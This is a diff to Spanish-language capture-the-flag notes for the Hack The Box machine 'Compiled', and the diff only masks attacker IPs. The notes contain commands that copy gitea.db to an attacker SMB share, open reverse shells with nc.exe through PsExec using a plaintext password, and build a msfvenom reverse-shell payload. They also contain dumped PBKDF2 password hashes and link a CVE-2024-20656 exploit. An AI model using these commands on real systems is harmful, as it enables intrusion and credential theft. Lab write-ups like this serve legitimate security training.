@@ -70,7 +70,7 @@ metemos el winpeas y examinamos el sistema
 pues hacemos el server y nos enviamos un archivo gitea.db
 
 sudo impacket-smbserver -smb2support share .
-copy gitea.db \\10.10.16.25\share
+copy gitea.db \\10.10.x.x\share
 
 richardrichardrichard@compiled.htbenabled4b4b53766fe946e7e291b106fcd6f4962934116ec9ac78a99b3bf6b06cf8568aaedd267ec02b39aeb244d83fb8b89c243b5epbkdf2$50000$502be54ff86f147c6cb9b55c8061d82d03d7cf2c96277dd16d95ed5c33bb524b62en-USfN5:f?{?f?{??richard@
 emilyemilyemily@compiled.htbenabled97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16pbkdf2$50000$500056552f6f2df0015762a4419b0748de227d873cca89103cd83a976bdac52486fP??fP???emily@compiled.htbarc-green
@@ -95,10 +95,10 @@ De hecho no había entregado el flag, así que aprovecho para entregarlo
 Lo primero hago una reverse shell estoy con evilwinrm y tengo problemas con el runascs así que me bajo psexec
 
 ./PsExec.exe -accepteula
-./PsExec.exe -u emily -p 12345678 .\nc.exe 10.10.16.11 4455 -> pero me da error
+./PsExec.exe -u emily -p 12345678 .\nc.exe 10.10.x.x 4455 -> pero me da error
 
 Parece que así si va
-./PsExec.exe -u emily -p 12345678 -c 'nc.exe 10.10.16.11 4455'
+./PsExec.exe -u emily -p 12345678 -c 'nc.exe 10.10.x.x 4455'
 
 Para escalar privilegios busco el exploit de VSStandardCollectorService150
 https://github.com/Wh04m1001/CVE-2024-20656
@@ -115,7 +115,7 @@ Sencillamente ajustamos las rutas y compilamos en visual studio
 
 upload del ejecutable compilado
 
-msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.25 lport=4456 -f exe > e.exe
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.x.x lport=4456 -f exe > e.exe
 y upload en c:\temp\e.exe
 
 ponemos a escuchar nc en el puerto 4456
